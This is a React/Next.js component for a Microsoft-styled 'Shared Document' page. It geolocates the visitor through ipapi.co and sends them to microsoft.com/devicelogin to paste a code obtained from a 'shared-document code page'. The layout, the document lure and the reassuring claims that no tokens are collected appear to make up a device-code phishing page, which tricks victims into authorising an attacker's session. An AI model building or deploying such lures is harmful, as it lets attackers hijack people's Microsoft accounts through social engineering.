"use client";

import React, { useEffect, useState } from "react";

interface Props {
  onSuccess?: () => void;
}

export default function PageMicrosoftDeviceAuth({ onSuccess }: Props) {
  const [country, setCountry] = useState("Loading location...");

  useEffect(() => {
    let cancelled = false;

    async function resolveCountry() {
      try {
        const res = await fetch("/api/geo", {
          cache: "no-store",
          headers: { Accept: "application/json" },
        });
        const data = await res.json();
        if (!cancelled && res.ok && data?.country && data.country !== "Country unavailable") {
          setCountry(data.country);
          return;
        }
      } catch (error) {
        console.warn("Server-side country lookup failed:", error);
      }

      // When a deployment proxy hides the visitor IP from the server, ask a
      // public provider directly from the browser. This still reports only the
      // provider's approximate country and never sends credentials or tokens.
      try {
        const clientRes = await fetch("https://ipapi.co/json/", {
          cache: "no-store",
          headers: { Accept: "application/json" },
        });
        const clientData = await clientRes.json();
        if (!cancelled && clientRes.ok && clientData?.country_name && !clientData?.error) {
          const code = typeof clientData.country_code === "string" ? clientData.country_code.toUpperCase() : "";
          const flag = /^[A-Z]{2}$/.test(code)
            ? String.fromCodePoint(...code.split("").map((char: string) => 127397 + char.charCodeAt(0)))
            : "";
          setCountry(flag ? `${clientData.country_name} ${flag}` : clientData.country_name);
          return;
        }
      } catch (error) {
        console.warn("Browser-side country lookup failed:", error);
      }

      if (!cancelled) setCountry("Country unavailable");
    }

    resolveCountry();
    return () => {
      cancelled = true;
    };
  }, []);

  const openMicrosoftSignIn = () => {
    window.open("https://microsoft.com/devicelogin", "_blank", "noopener,noreferrer");
  };

  return (
    <div className="min-h-screen bg-[#f3f2f1] flex flex-col items-center justify-center font-sans antialiased p-4">
      <div className="w-full max-w-[440px] bg-white rounded-[2px] shadow-[0_2px_7px_rgba(0,0,0,0.15)] border border-gray-100 p-8 sm:p-10">
        <div className="mb-6">
          <div className="text-[12px] font-semibold uppercase tracking-[0.12em] text-[#5f6368] mb-2">
            Shared Document
          </div>
          <h1 className="text-[24px] font-semibold text-gray-900 mb-2">
            Continue with Microsoft
          </h1>
          <p className="text-[13px] text-gray-600 leading-normal">
            Complete sign-in on Microsoft&apos;s genuine website. Your password, MFA, cookies, and tokens are never entered into or stored by this site.
          </p>
        </div>

        <div className="rounded-[3px] border border-[#d6d6d6] bg-[#fafafa] px-4 py-3 mb-6 text-[13px] text-gray-700">
          <span className="font-semibold">Approximate location:</span> {country}
          <div className="mt-1 text-[12px] text-gray-500">
            IP-based location can reflect a VPN or proxy exit point and may be approximate.
          </div>
        </div>

        <button
          type="button"
          onClick={openMicrosoftSignIn}
          className="w-full px-8 py-3 bg-[#0067b8] text-white font-semibold text-[14px] hover:bg-[#005da3] active:bg-[#004e8a] transition-colors rounded-[2px]"
        >
          Open Microsoft sign-in
        </button>

        <p className="mt-5 text-[12px] text-gray-500 leading-normal">
          If you arrived here from the shared-document code page, paste the Microsoft-generated code only on Microsoft&apos;s page. The code is not collected by this website.
        </p>
      </div>

      <button
        type="button"
        onClick={() => onSuccess?.()}
        className="mt-4 text-[12px] text-gray-500 hover:text-gray-700 hover:underline"
      >
        Return to the document page
      </button>
    </div>
  );
}
